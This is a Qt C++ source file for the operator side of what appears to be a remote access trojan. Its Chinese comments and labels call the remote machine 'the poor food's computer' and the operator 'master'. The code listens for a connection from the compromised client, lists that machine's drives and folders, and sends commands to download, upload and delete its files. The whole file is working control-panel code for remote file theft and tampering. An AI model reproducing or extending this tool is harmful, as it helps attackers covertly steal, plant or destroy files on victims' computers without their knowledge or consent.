#include "file.h"

File::File(QWidget *parent) : QWidget(parent), mSock(nullptr)
{
    // 初始化路径
    // 这里有一个地方需要注意 如果qdir要代表非本地的路径
    // 不要对其使用absolutePath 这会使得系统自动加上当前程序的本地绝对路径
    // 应该使用dirName得到我们设置好的代表远端的路径
    _curFoodDir.setPath("");
    _curLocalDir.setPath(QDir::currentPath());

    // 初始化窗口
    const int w = 500, h = 600;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    // 固定大小
    this->setGeometry(x, y, w, h);
    this->setMinimumSize(w, h);
    this->setMaximumSize(w, h);

    // 设置提示
    QLabel *lbFood = new QLabel("可怜的食物的电脑:", this);
    lbFood->setGeometry(10,10,150,20);
    QLabel *lbLocal = new QLabel("主人您的电脑:", this);
    lbLocal->setGeometry(10,300,150,30);

    // 设置文件列表
    mFoodFileList = new QListWidget(this);
    mFoodFileList->setGeometry(10,30,480,260);
    mFoodFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mFoodFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadFoodDir(QListWidgetItem *)));

    mLocalFileList = new QListWidget(this);
    mLocalFileList->setGeometry(10,330,480,260);
    mLocalFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mLocalFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadLocalDir(QListWidgetItem *)));

    // 食物列表的操作菜单
    mFoodMenu = new QMenu(this);
    QAction *actFoodRefresh = mFoodMenu->addAction("刷新");
    connect(actFoodRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshFoodList()));
    QAction *actDownload = mFoodMenu->addAction("下载（只能对文件进行操作）");
    connect(actDownload,SIGNAL(triggered(bool)), this,SLOT(downloadFile()));
    QAction *actDelete = mFoodMenu->addAction("删除（只能对文件进行操作）");
    connect(actDelete, SIGNAL(triggered(bool)), this, SLOT(deleteFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mFoodFileList->installEventFilter(this);

    // 本机列表的操作菜单
    mLocalMenu = new QMenu(this);
    QAction *actLocalRefresh = mLocalMenu->addAction("刷新");
    connect(actLocalRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshLocalList()));
    QAction *actUpload= mLocalMenu->addAction("上传（只能对文件进行操作）");
    connect(actUpload,SIGNAL(triggered(bool)), this,SLOT(uploadFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mLocalFileList->installEventFilter(this);
}

int File::startFileServer(QString userName)
{
    // 设置窗口标题
    _userName = userName;
    this->setWindowTitle(userName.append("-文件操作"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启文件监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void File::addFilesToList(QListWidget *list, QList<QByteArray> strList, QFileIconProvider::IconType iconType, QString type)
{
    foreach (QByteArray bs, strList) {
        QString s = codec->toUnicode(bs);
        if (s.size() > 0) {
            QListWidgetItem *item = new QListWidgetItem(list);

            // 设置头像
            item->setIcon(QFileIconProvider().icon(iconType));

            // 设置类型(这个东西好神奇)
            item->setWhatsThis(type);

            // 增加文件到列表
            item->setText(s);
            list->addItem(item);
        }
    }
}

QStringList File::getCurrentFile(QListWidget *list)
{
    // 可以多选
    QStringList files;
    if (list->currentRow() >= 0) {
        QList<QListWidgetItem *> items = list->selectedItems();
        foreach(QListWidgetItem *it, items) {
            // 只获取文件
            if( it->whatsThis() == FileTypeFile ) {
                files.append(it->text());
            }
        }
    }
    return files;
}

QList<QByteArray> File::getLocalDrives()
{
    // 获取本机盘符
    QFileInfoList fileList = QDir::drives();
    QList<QByteArray> baList;
    foreach(QFileInfo info , fileList) {
        baList.append(codec->fromUnicode(info.filePath()));
    }
    return baList;
}

QList<QByteArray> File::getLocalDirs(QDir dir)
{
    // 获取目录下的所有目录
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Dirs);
    foreach(QString s, strList) {
        if (s!="." && s!="..") {
            baList.append(codec->fromUnicode(s));
        }
    }
    return baList;
}

// 这里TM的qt自带方法也太方便了吧。。。
QList<QByteArray> File::getLocalFiles(QDir dir)
{
    // 获取本机目录下的文件
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Files);
    foreach(QString s, strList) {
        baList.append(codec->fromUnicode(s));
    }
    return baList;
}

void File::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 获取所有盘符
    if (cmd == CmdSendDrives) {
        doSendDrives(hashArgs);
        return;
    }

    // 获取客户端目录下的所有目录
    if (cmd == CmdSendDirs) {
        doSendDirs(hashArgs);
        return;
    }

    // 获取客户端目录下的所有文件
    if (cmd == CmdSendFiles) {
        doSendFiles(hashArgs);
        return;
    }

    // 删除文件成功
    if (cmd == CmdDeleteFileSuccess) {
        //QMessageBox::information(this, "提示","删除文件成功");
        return;
    }

    // 删除文件失败
    if (cmd == CmdDeleteFileFailed) {
        QMessageBox::warning(this, "提示","删除文件失败");
        return;
    }
}

QHash<QByteArray, QByteArray> File::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void File::doSendDrives(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curFoodDir.setPath("");

    // 清空列表
    mFoodFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DRIVES"].split(CmdFileSplit[0]);
    addFilesToList(mFoodFileList, strList, QFileIconProvider::Drive, FileTypeDrive);
}

void File::doSendDirs(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curFoodDir.setPath(codec->toUnicode(args["DIR"]));

    // 清空列表
    mFoodFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DIRS"].split(CmdFileSplit[0]);

    // 返回上一页名字
    strList.push_front(_dirBack);

    addFilesToList(mFoodFileList, strList, QFileIconProvider::Folder, FileTypeDir);
}

void File::doSendFiles(QHash<QByteArray, QByteArray> &args)
{
    // 打印到列表上
    QList<QByteArray> strList = args["FILES"].split(CmdFileSplit[0]);
    addFilesToList(mFoodFileList, strList, QFileIconProvider::File, FileTypeFile);
}

void File::loadFoodDir(QListWidgetItem *item)
{
    // 双击后加载新文件夹
    if (item->whatsThis() == FileTypeDir || item->whatsThis() == FileTypeDrive) {
        QDir dir;
        // 如果点击的是..
        if (item->text() == "..") {
            // 如果已经是在盘符了
            if (_curFoodDir.dirName().right(2) == ":\\") {
                // 就是根目录
                dir.setPath("");
            } else {
                // 否则 先去掉最后一个结尾反斜杠
                int tmpSize = _curFoodDir.dirName().size();
                QString tmpDir = _curFoodDir.dirName().left(tmpSize-1);
                // 再截取到最后一个反斜杠（包含） 就可以得到上层路径
                dir = QDir(tmpDir.left(tmpDir.lastIndexOf('\\')+1));
            }
        } else {
            // 点击之前 所在目录为比磁盘还高的根目录
            if (_curFoodDir.dirName().size() == 0){
                // 加上磁盘路径
                dir = QDir(_curFoodDir.dirName()+item->text());
            }else {
                // 不在根目录 但是最右边已经有了反斜杠 就直接加上点击路径名即可
                if (_curFoodDir.dirName().right(1) == '\\'){
                    dir = QDir(_curFoodDir.dirName()+item->text()+'\\');
                }else {
                    // 否则就要再加反斜杠, 注意 作为目录而言 最后再加一个反斜杠比较好理解
                    dir = QDir(_curFoodDir.dirName()+'\\'+item->text()+'\\');
                }
            }
        }
        qDebug() << "食物当前文件路径"<< dir.dirName();
        refreshFoodList(dir);
    }
}

void File::refreshFoodList()
{
    if (mSock) {
        // 获取当前路径下的所有文件
        // 拼接命令
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+_curFoodDir.dirName());
        data.append(CmdEnd);
        mSock->write(codec->fromUnicode(data));
    }
}

void File::refreshFoodList(QDir dir)
{
    if (mSock) {
        // 获取当前路径下的所有文件
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+dir.dirName()); // 注意！这里不能使用absolutepath 否则会自动加上本地目录前缀
        data.append(CmdEnd);
        mSock->write(codec->fromUnicode(data));
    }
}

void File::downloadFile()
{
    QStringList files = getCurrentFile(mFoodFileList);
    if (mSock) {
        foreach(QString fileName, files) {
            // 开始接收文件
            QDir localDir = _curLocalDir.absoluteFilePath(fileName);
            QDir foodDir = _curFoodDir.dirName() + fileName;
            FileTransfer *ft = new FileTransfer();
            int port = ft->startRecvFileServer(_userName,localDir.path());

            if (port != -1) {
                // 发送下载命令
                QString data;
                data.append(CmdDownloadFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+foodDir.path()+CmdSplit);
                data.append("PORT"+CmdSplit+QString::number(port));
                data.append(CmdEnd);
                mSock->write(codec->fromUnicode(data));
            }
        }
    }
}

void File::deleteFile()
{
    if (mSock) {
        // 删除当前文件
        QStringList files = getCurrentFile(mFoodFileList);
        if (files.length() > 0) {
            foreach(QString file, files) {
                QString path = _curFoodDir.dirName() + file;

                // 发送数据
                QString data;
                data.append(CmdDeleteFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+path);
                data.append(CmdEnd);
                mSock->write(codec->fromUnicode(data));

                // 刷新列表
                refreshFoodList();
            }
        }
    }

}

void File::loadLocalDir(QListWidgetItem *item)
{
    // 双击后加载新文件夹
    if (item->whatsThis() == FileTypeDrive || item->whatsThis() == FileTypeDir) {
        QDir dir = _curLocalDir;
        dir.cd(item->text());

        if (dir == _curLocalDir) {
            dir.setPath("");
        }
        _curLocalDir = dir;

        loadLocalDir(dir);
    }
}

void File::loadLocalDir(QDir dir)
{
    if (dir.path() == "") {
        // 获取盘符
        QList<QByteArray> driveList = getLocalDrives();

        // 清空列表
        mLocalFileList->clear();

        addFilesToList(mLocalFileList, driveList, QFileIconProvider::Drive, FileTypeDrive);
    } else {
        // 获取路径
        QList<QByteArray> dirList = getLocalDirs(dir);

        // 获取文件
        QList<QByteArray> fileList = getLocalFiles(dir);

        // 清空列表
        mLocalFileList->clear();

        dirList.push_front(_dirBack);
        addFilesToList(mLocalFileList, dirList, QFileIconProvider::Folder, FileTypeDir);
        addFilesToList(mLocalFileList, fileList, QFileIconProvider::File, FileTypeFile);
    }
}

void File::refreshLocalList()
{
    loadLocalDir(_curLocalDir);
}

void File::uploadFile()
{
    QStringList files = getCurrentFile(mLocalFileList);
    if (mSock && files.length() > 0) {
        foreach(QString fileName, files) {
            // 开始接收文件
            QDir localDir = _curLocalDir.absoluteFilePath(fileName);
            QDir foodDir = _curFoodDir.dirName() + fileName;
            FileTransfer *ft = new FileTransfer();
            int port = ft->startSendFileServer(_userName,localDir.path());

            if (port != -1) {
                // 发送下载命令
                QString data;
                data.append(CmdUploadFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+foodDir.path()+CmdSplit);
                data.append("PORT"+CmdSplit+QString::number(port));
                data.append(CmdEnd);
                mSock->write(codec->fromUnicode(data));

            }
        }
    }
}

void File::newConnection(QTcpSocket *s)
{
    // 新增食物
    mSock = new TcpSocket(s, this);
    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 获取食物盘符
    refreshFoodList();

    // 获取本机当前目录
    refreshLocalList();

    // 不再监听新客户
    mServer->server()->close();
}

void File::processBuffer()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // 提取指令和参数
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        } else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex+CmdSplit.length(), data.length());
        }

        // 处理指令
        processCommand(cmd, args);
    }
}

bool File::eventFilter(QObject *watched, QEvent *event)
{
    // 右键弹出菜单
    if (watched == (QObject*)mFoodFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mFoodMenu->exec(QCursor::pos());
        }
    } else if (watched==(QObject*)mLocalFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mLocalMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}

void File::closeEvent(QCloseEvent *)
{
    // 删除窗口
    deleteLater();
}
